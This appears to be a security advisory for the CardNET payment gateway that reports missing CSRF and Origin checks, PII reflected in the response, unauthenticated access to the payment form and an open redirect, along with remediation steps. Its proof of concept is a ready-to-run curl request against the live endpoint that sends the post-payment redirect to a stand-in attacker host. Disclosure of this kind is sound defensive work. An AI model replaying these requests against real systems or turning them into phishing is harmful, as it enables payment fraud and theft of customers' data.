# 🟢 CardNET Payment Gateway — No Origin/CSRF Validation + PII Exposure in Plaintext

**ID:** NSI-SA-2026-006-C001
**Target:** `https://ecommerce.cardnet.com.do/sirite/pasarela-pago/transaccion`
**Severity:** 🔴 **High**
**Program:** CardNET / Policía Nacional RD

---

## Summary

The CardNET SIRITE payment gateway endpoint `/sirite/pasarela-pago/transaccion`:

1. **Accepts POST requests from any origin** — no CSRF tokens, no Origin/Referer validation
2. **Reflects PII** (full name + national ID number) in the HTML response — exposed in logs
3. **Returns a full credit card payment form** without authentication
4. **Accepts arbitrary urlRetorno** — enables phishing redirects

---

## PoC 1 — Cross-Origin Payment Form Access

```bash
curl -sk -X POST "https://ecommerce.cardnet.com.do/sirite/pasarela-pago/transaccion" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: https://attacker-controlled.com" \
  -H "Referer: https://attacker-controlled.com/fake-cardnet.html" \
  -d "codigoCentroRecaudacion=0020&codigoServicio=0252&montoServicio=100.00&urlRetorno=https://attacker-controlled.com/steal&nombre=Maria%20Gomez%20Rodriguez&numeroDocumento=40212345678&tipoDocumento=CEDULA&medioPago=PagoEnLinea&idAutorizacionPortal=H1POC001&numeroAutorizacion="
```

**Response:** HTTP 200 — Full credit card payment form (9,006 bytes)

## PoC 2 — PII Reflection

The same request reflects PII in the response:

```html
<strong> Maria Gomez Rodriguez </strong>
<strong> 40212345678 </strong>
<strong> Policía Nacional </strong>
```

All 13 cédula variants tested return identical response size (9081 bytes), confirming **no server-side PII validation** — the gateway echoes whatever data is sent.

## PoC 3 — Arbitrary Redirect

The `urlRetorno` parameter is accepted without validation:
```
urlRetorno=https://attacker-controlled.com/steal
```

After payment processing, the user would be redirected to the attacker's site.

---

## Affected Endpoint

```
POST https://ecommerce.cardnet.com.do/sirite/pasarela-pago/transaccion
```

| Parameter | Example | Issue |
|-----------|---------|-------|
| codigoCentroRecaudacion | 0020 | Valid code |
| codigoServicio | 0252 | Valid code |
| montoServicio | 100.00 | Fixed price |
| urlRetorno | https://evil.com | 🚩 **Not validated** |
| nombre | Any value | 🚩 **Arbitrary PII** |
| numeroDocumento | Any cédula | 🚩 **Arbitrary PII** |
| idAutorizacionPortal | Any UUID | 🚩 **Client-controlled** |

---

## Impact

| Vector | Impact |
|--------|--------|
| CSRF / Phishing | Attacker embeds real CardNET payment form from any origin |
| PII Exposure | Name + national ID in plaintext POST (visible in logs, WAF, proxies) |
| Redirect Hijack | Post-payment redirect to attacker-controlled URL |
| Unauthenticated Access | No login/session required to access payment form |

---

## Remediation

1. Validate Origin/Referer headers
2. Require CSRF tokens
3. Validate urlRetorno against allowed patterns
4. Require authentication for payment initiation
5. Do not reflect PII in response HTML

---

## Timeline

- **2026-07-15:** Discovery and verification
